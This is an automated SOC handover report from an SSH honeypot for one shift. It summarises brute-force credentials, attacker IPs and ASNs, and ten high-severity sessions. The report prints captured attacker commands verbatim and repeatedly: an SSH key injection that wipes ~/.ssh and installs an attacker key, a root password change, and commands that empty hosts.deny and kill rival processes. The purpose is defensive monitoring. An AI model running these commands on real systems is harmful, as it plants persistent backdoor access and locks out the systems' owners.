# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-24 |
| **Generated At** | 2026-03-24T19:00:27Z |
| **Shift Time** | 19:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **111** |
| Confirmed Threats | **92** |
| False Positives Filtered | **19** (17.1%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **20** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **101** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **73** |
| Unique Credential Pairs | **58** |
| Unique Usernames | **51** |
| Unique Passwords | **48** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 4 |
| `erwin` | 2 |
| `tms` | 2 |
| `shoutcast` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 5 |
| `1234` | 5 |
| `12345678` | 4 |
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `erwin` | `123` | 2 |
| `tms` | `tms123!` | 2 |
| `shoutcast` | `shoutcast` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `asdfgh` | `92.84.21.186` | 2026-03-24T18:15:55 |
| `root` | `1Qaz2wsx!@#` | `216.180.127.201` | 2026-03-24T18:30:00 |
| `root` | `3245gs5662d34` | `216.180.127.201` | 2026-03-24T18:30:06 |
| `root` | `Hh12345678` | `216.180.127.201` | 2026-03-24T18:31:51 |
| `root` | `Welcome@2024` | `8.222.177.149` | 2026-03-24T18:57:02 |
| `root` | `3245gs5662d34` | `8.222.177.149` | 2026-03-24T18:57:05 |
| `root` | `Cc123456` | `101.126.24.58` | 2026-03-24T18:57:39 |
| `root` | `1q2w3e4r5t6y7u` | `8.222.177.149` | 2026-03-24T18:57:55 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:pDn3Jz33Kibs"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.24.58`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `8.222.177.149`, `216.180.127.201`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **32** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS212512` | Detai Prosperous Technologies Limited | 2 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS17488` | Hathway IP Over Cable Internet | 1 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 1 | LOW |
| `AS42610` | PJSC Rostelecom | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6694b4093d58

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-03-24 18:15 |
| **Last Seen** | 2026-03-24 18:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:15:54` | `cowrie.session.connect` |
| `2026-03-24 18:15:54` | `cowrie.client.version` |
| `2026-03-24 18:15:54` | `cowrie.client.kex` |
| `2026-03-24 18:15:55` | `cowrie.login.success` |
| `2026-03-24 18:15:56` | `cowrie.direct-tcpip.request` |
| `2026-03-24 18:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a5fea86ce4

| Field | Detail |
|---|---|
| **Source IP** | `216.180.127[.]201` |
| **First Seen** | 2026-03-24 18:29 |
| **Last Seen** | 2026-03-24 18:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:29:58` | `cowrie.session.connect` |
| `2026-03-24 18:29:58` | `cowrie.client.version` |
| `2026-03-24 18:29:59` | `cowrie.client.kex` |
| `2026-03-24 18:30:00` | `cowrie.login.success` |
| `2026-03-24 18:30:00` | `cowrie.session.params` |
| `2026-03-24 18:30:00` | `cowrie.command.input` |
| `2026-03-24 18:30:00` | `cowrie.command.failed` |
| `2026-03-24 18:30:00` | `cowrie.log.closed` |
| `2026-03-24 18:30:01` | `cowrie.session.params` |
| `2026-03-24 18:30:01` | `cowrie.command.input` |
| `2026-03-24 18:30:01` | `cowrie.session.file_download` |
| `2026-03-24 18:30:01` | `cowrie.log.closed` |
| `2026-03-24 18:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.180.127[.]201` to AbuseIPDB if not already reported
- [ ] Block `216.180.127[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a348a9e1e571

| Field | Detail |
|---|---|
| **Source IP** | `216.180.127[.]201` |
| **First Seen** | 2026-03-24 18:30 |
| **Last Seen** | 2026-03-24 18:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:30:05` | `cowrie.session.connect` |
| `2026-03-24 18:30:05` | `cowrie.client.version` |
| `2026-03-24 18:30:05` | `cowrie.client.kex` |
| `2026-03-24 18:30:06` | `cowrie.login.success` |
| `2026-03-24 18:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.180.127[.]201` to AbuseIPDB if not already reported
- [ ] Block `216.180.127[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ebec4a3e72f

| Field | Detail |
|---|---|
| **Source IP** | `216.180.127[.]201` |
| **First Seen** | 2026-03-24 18:31 |
| **Last Seen** | 2026-03-24 18:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:31:50` | `cowrie.session.connect` |
| `2026-03-24 18:31:50` | `cowrie.client.version` |
| `2026-03-24 18:31:50` | `cowrie.client.kex` |
| `2026-03-24 18:31:51` | `cowrie.login.success` |
| `2026-03-24 18:31:52` | `cowrie.session.params` |
| `2026-03-24 18:31:52` | `cowrie.command.input` |
| `2026-03-24 18:31:52` | `cowrie.command.failed` |
| `2026-03-24 18:31:52` | `cowrie.log.closed` |
| `2026-03-24 18:31:53` | `cowrie.session.params` |
| `2026-03-24 18:31:53` | `cowrie.command.input` |
| `2026-03-24 18:31:53` | `cowrie.session.file_download` |
| `2026-03-24 18:31:53` | `cowrie.log.closed` |
| `2026-03-24 18:31:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.180.127[.]201` to AbuseIPDB if not already reported
- [ ] Block `216.180.127[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86f175449c13

| Field | Detail |
|---|---|
| **Source IP** | `216.180.127[.]201` |
| **First Seen** | 2026-03-24 18:31 |
| **Last Seen** | 2026-03-24 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:31:56` | `cowrie.session.connect` |
| `2026-03-24 18:31:56` | `cowrie.client.version` |
| `2026-03-24 18:31:56` | `cowrie.client.kex` |
| `2026-03-24 18:31:57` | `cowrie.login.success` |
| `2026-03-24 18:31:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.180.127[.]201` to AbuseIPDB if not already reported
- [ ] Block `216.180.127[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-906503b2f0eb

| Field | Detail |
|---|---|
| **Source IP** | `8.222.177[.]149` |
| **First Seen** | 2026-03-24 18:57 |
| **Last Seen** | 2026-03-24 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:57:02` | `cowrie.session.connect` |
| `2026-03-24 18:57:02` | `cowrie.client.version` |
| `2026-03-24 18:57:02` | `cowrie.client.kex` |
| `2026-03-24 18:57:02` | `cowrie.login.success` |
| `2026-03-24 18:57:02` | `cowrie.session.params` |
| `2026-03-24 18:57:02` | `cowrie.command.input` |
| `2026-03-24 18:57:02` | `cowrie.command.failed` |
| `2026-03-24 18:57:02` | `cowrie.log.closed` |
| `2026-03-24 18:57:03` | `cowrie.session.params` |
| `2026-03-24 18:57:03` | `cowrie.command.input` |
| `2026-03-24 18:57:03` | `cowrie.session.file_download` |
| `2026-03-24 18:57:03` | `cowrie.log.closed` |
| `2026-03-24 18:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.177[.]149` to AbuseIPDB if not already reported
- [ ] Block `8.222.177[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f459be94c392

| Field | Detail |
|---|---|
| **Source IP** | `8.222.177[.]149` |
| **First Seen** | 2026-03-24 18:57 |
| **Last Seen** | 2026-03-24 18:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:57:04` | `cowrie.session.connect` |
| `2026-03-24 18:57:04` | `cowrie.client.version` |
| `2026-03-24 18:57:04` | `cowrie.client.kex` |
| `2026-03-24 18:57:05` | `cowrie.login.success` |
| `2026-03-24 18:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.177[.]149` to AbuseIPDB if not already reported
- [ ] Block `8.222.177[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f30aaaacfc46

| Field | Detail |
|---|---|
| **Source IP** | `101.126.24[.]58` |
| **First Seen** | 2026-03-24 18:57 |
| **Last Seen** | 2026-03-24 18:58 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pDn3Jz33Kibs"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:57:38` | `cowrie.session.connect` |
| `2026-03-24 18:57:38` | `cowrie.client.version` |
| `2026-03-24 18:57:38` | `cowrie.client.kex` |
| `2026-03-24 18:57:39` | `cowrie.login.success` |
| `2026-03-24 18:57:40` | `cowrie.session.params` |
| `2026-03-24 18:57:40` | `cowrie.command.input` |
| `2026-03-24 18:57:40` | `cowrie.command.failed` |
| `2026-03-24 18:57:40` | `cowrie.log.closed` |
| `2026-03-24 18:57:40` | `cowrie.session.params` |
| `2026-03-24 18:57:40` | `cowrie.command.input` |
| `2026-03-24 18:57:41` | `cowrie.session.file_download` |
| `2026-03-24 18:57:41` | `cowrie.log.closed` |
| `2026-03-24 18:57:53` | `cowrie.session.params` |
| `2026-03-24 18:57:53` | `cowrie.command.input` |
| `2026-03-24 18:57:53` | `cowrie.log.closed` |
| `2026-03-24 18:57:54` | `cowrie.session.params` |
| `2026-03-24 18:57:54` | `cowrie.command.input` |
| `2026-03-24 18:57:54` | `cowrie.log.closed` |
| `2026-03-24 18:57:55` | `cowrie.session.params` |
| `2026-03-24 18:57:55` | `cowrie.command.input` |
| `2026-03-24 18:57:55` | `cowrie.session.file_download` |
| `2026-03-24 18:57:55` | `cowrie.log.closed` |
| `2026-03-24 18:57:56` | `cowrie.session.params` |
| `2026-03-24 18:57:56` | `cowrie.command.input` |
| `2026-03-24 18:57:56` | `cowrie.log.closed` |
| `2026-03-24 18:57:56` | `cowrie.session.params` |
| `2026-03-24 18:57:56` | `cowrie.command.input` |
| `2026-03-24 18:57:57` | `cowrie.log.closed` |
| `2026-03-24 18:57:57` | `cowrie.session.params` |
| `2026-03-24 18:57:57` | `cowrie.command.input` |
| `2026-03-24 18:57:57` | `cowrie.command.input` |
| `2026-03-24 18:57:58` | `cowrie.log.closed` |
| `2026-03-24 18:57:58` | `cowrie.session.params` |
| `2026-03-24 18:57:58` | `cowrie.command.input` |
| `2026-03-24 18:57:58` | `cowrie.log.closed` |
| `2026-03-24 18:57:59` | `cowrie.session.params` |
| `2026-03-24 18:57:59` | `cowrie.command.input` |
| `2026-03-24 18:57:59` | `cowrie.log.closed` |
| `2026-03-24 18:58:00` | `cowrie.session.params` |
| `2026-03-24 18:58:00` | `cowrie.command.input` |
| `2026-03-24 18:58:00` | `cowrie.log.closed` |
| `2026-03-24 18:58:01` | `cowrie.session.params` |
| `2026-03-24 18:58:01` | `cowrie.command.input` |
| `2026-03-24 18:58:01` | `cowrie.log.closed` |
| `2026-03-24 18:58:02` | `cowrie.session.params` |
| `2026-03-24 18:58:02` | `cowrie.command.input` |
| `2026-03-24 18:58:02` | `cowrie.log.closed` |
| `2026-03-24 18:58:02` | `cowrie.session.params` |
| `2026-03-24 18:58:02` | `cowrie.command.input` |
| `2026-03-24 18:58:03` | `cowrie.log.closed` |
| `2026-03-24 18:58:03` | `cowrie.session.params` |
| `2026-03-24 18:58:03` | `cowrie.command.input` |
| `2026-03-24 18:58:03` | `cowrie.log.closed` |
| `2026-03-24 18:58:04` | `cowrie.session.params` |
| `2026-03-24 18:58:04` | `cowrie.command.input` |
| `2026-03-24 18:58:04` | `cowrie.log.closed` |
| `2026-03-24 18:58:05` | `cowrie.session.params` |
| `2026-03-24 18:58:05` | `cowrie.command.input` |
| `2026-03-24 18:58:05` | `cowrie.log.closed` |
| `2026-03-24 18:58:06` | `cowrie.session.params` |
| `2026-03-24 18:58:06` | `cowrie.command.input` |
| `2026-03-24 18:58:06` | `cowrie.log.closed` |
| `2026-03-24 18:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.24[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.126.24[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-835412798efc

| Field | Detail |
|---|---|
| **Source IP** | `8.222.177[.]149` |
| **First Seen** | 2026-03-24 18:57 |
| **Last Seen** | 2026-03-24 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:57:55` | `cowrie.session.connect` |
| `2026-03-24 18:57:55` | `cowrie.client.version` |
| `2026-03-24 18:57:55` | `cowrie.client.kex` |
| `2026-03-24 18:57:55` | `cowrie.login.success` |
| `2026-03-24 18:57:55` | `cowrie.session.params` |
| `2026-03-24 18:57:55` | `cowrie.command.input` |
| `2026-03-24 18:57:55` | `cowrie.command.failed` |
| `2026-03-24 18:57:55` | `cowrie.log.closed` |
| `2026-03-24 18:57:55` | `cowrie.session.params` |
| `2026-03-24 18:57:55` | `cowrie.command.input` |
| `2026-03-24 18:57:55` | `cowrie.session.file_download` |
| `2026-03-24 18:57:55` | `cowrie.log.closed` |
| `2026-03-24 18:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.177[.]149` to AbuseIPDB if not already reported
- [ ] Block `8.222.177[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053ffb7c3103

| Field | Detail |
|---|---|
| **Source IP** | `8.222.177[.]149` |
| **First Seen** | 2026-03-24 18:57 |
| **Last Seen** | 2026-03-24 18:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 18:57:57` | `cowrie.session.connect` |
| `2026-03-24 18:57:57` | `cowrie.client.version` |
| `2026-03-24 18:57:57` | `cowrie.client.kex` |
| `2026-03-24 18:57:57` | `cowrie.login.success` |
| `2026-03-24 18:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.222.177[.]149` to AbuseIPDB if not already reported
- [ ] Block `8.222.177[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.24[.]58` | **10** | 2026-03-24 18:51 | 2026-03-24 18:57 | 12m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.105[.]165` | **10** | 2026-03-24 18:19 | 2026-03-24 18:24 | 14m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.209.52[.]196` | **10** | 2026-03-24 17:12 | 2026-03-24 17:35 | 0m | 9 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `216.180.127[.]201` | **10** | 2026-03-24 18:19 | 2026-03-24 18:37 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `47.242.143[.]122` | **10** | 2026-03-24 17:09 | 2026-03-24 17:26 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.222.177[.]149` | **10** | 2026-03-24 18:46 | 2026-03-24 18:58 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `47.237.119[.]139` | **4** | 2026-03-24 18:45 | 2026-03-24 18:53 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `100.38.151[.]62` | 1 | 2026-03-24 17:17 | 2026-03-24 17:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `106.240.35[.]158` | 1 | 2026-03-24 17:12 | 2026-03-24 17:12 | 31s | 0 | `T1592` | 🟢 LOW |
| `112.53.70[.]99` | 1 | 2026-03-24 17:00 | 2026-03-24 17:00 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.70.176[.]2` | 1 | 2026-03-24 17:15 | 2026-03-24 17:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.243.121[.]95` | 1 | 2026-03-24 18:11 | 2026-03-24 18:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `140.249.22[.]89` | 1 | 2026-03-24 17:00 | 2026-03-24 17:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.30.251[.]185` | 1 | 2026-03-24 18:41 | 2026-03-24 18:41 | 14s | 0 | `T1592` | 🟢 LOW |
